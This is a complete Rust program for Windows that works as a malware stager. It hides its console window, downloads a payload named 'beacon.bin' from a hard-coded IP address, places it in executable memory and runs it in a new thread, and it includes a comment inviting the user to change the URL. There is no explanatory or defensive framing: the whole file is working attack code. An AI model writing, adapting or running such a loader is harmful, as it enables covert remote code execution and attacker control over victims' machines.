// THIS LINE IS THE ONLY THING THAT REMOVES THE CONSOLE WINDOW
#![cfg_attr(windows, windows_subsystem = "windows")]

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

fn main() {
    // === CHANGE THIS URL ===
    let url = "http://10.69.27.163:9999/beacon.bin";

    let payload = match reqwest::blocking::get(url) {
        Ok(r) if r.status().is_success() => r.bytes().unwrap().to_vec(),
        _ => return,
    };

    unsafe {
        let mem = VirtualAlloc(
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if mem.is_null() { return; }

        std::ptr::copy_nonoverlapping(payload.as_ptr(), mem.cast(), payload.len());

        let thread = match CreateThread(
            None,
            0,
            Some(std::mem::transmute(mem)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        ) {
            Ok(t) => t,
            Err(_) => { VirtualFree(mem, 0, MEM_RELEASE); return; }
        };

        WaitForSingleObject(thread, u32::MAX);  // INFINITE = u32::MAX
        CloseHandle(thread);
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}
